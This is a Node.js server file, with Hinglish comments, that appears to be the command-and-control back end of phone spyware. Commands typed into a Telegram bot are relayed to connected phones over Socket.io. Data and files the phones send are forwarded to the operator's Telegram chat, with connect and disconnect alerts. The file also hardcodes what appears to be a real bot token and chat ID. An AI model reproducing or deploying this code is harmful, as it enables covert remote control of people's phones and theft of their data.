const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Telegraf } = require('telegraf');
const multer = require('multer'); // Multipart handling ke liye

const app = express();
const server = http.createServer(app);

// Multer setup: File ko memory mein rakhenge taaki seedha Telegram ko forward kar sakein
const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 50 * 1024 * 1024 } // 50MB limit
});

const BOT_TOKEN = '8746887497:AAHNMQ2RAMI_iu9-KUVoKum72zZIsUhh00E';
const MY_CHAT_ID = '7066124462'; 
const bot = new Telegraf(BOT_TOKEN);

const io = new Server(server, {
    cors: { origin: "*" },
    allowEIO3: true 
});

// --- HTTP POST ENDPOINT (For Large Files) ---
app.post('/upload', upload.single('file'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).send('No file uploaded.');
        }

        console.log(`[HTTP] Received: ${req.file.originalname}`);

        // Binary buffer ko seedha Telegram par bhej rahe hain
        bot.telegram.sendDocument(MY_CHAT_ID, {
            source: req.file.buffer,
            filename: req.file.originalname
        }, {
            caption: `✅ File Received (HTTP): ${req.file.originalname}`
        })
        .then(() => res.status(200).send('Upload Successful'))
        .catch((err) => {
            console.error('Telegram Error:', err);
            res.status(500).send('Telegram Upload Failed');
        });

    } catch (err) {
        console.error('Server Error:', err);
        res.status(500).send('Internal Server Error');
    }
});

// --- TELEGRAM COMMANDS ---
bot.on('text', (ctx) => {
    const command = ctx.message.text;
    if (command === '/start') return ctx.reply('Welcome! Send commands to the phone.');
    
    io.emit('phone_command', command);
    ctx.reply(`[>] Command Sent: ${command}`);
});

bot.launch();

// --- SOCKET LOGIC ---
app.get('/', (req, res) => res.send('Server is Live! Use /upload for files.'));

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);
    bot.telegram.sendMessage(MY_CHAT_ID, `📱 Phone Connected!`).catch(e => {});

    socket.on('phone_data', (data) => {
        bot.telegram.sendMessage(MY_CHAT_ID, `⚠️ DATA:\n${JSON.stringify(data, null, 2)}`);
    });

    socket.on('disconnect', () => {
        bot.telegram.sendMessage(MY_CHAT_ID, '❌ Phone Disconnected.');
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
    
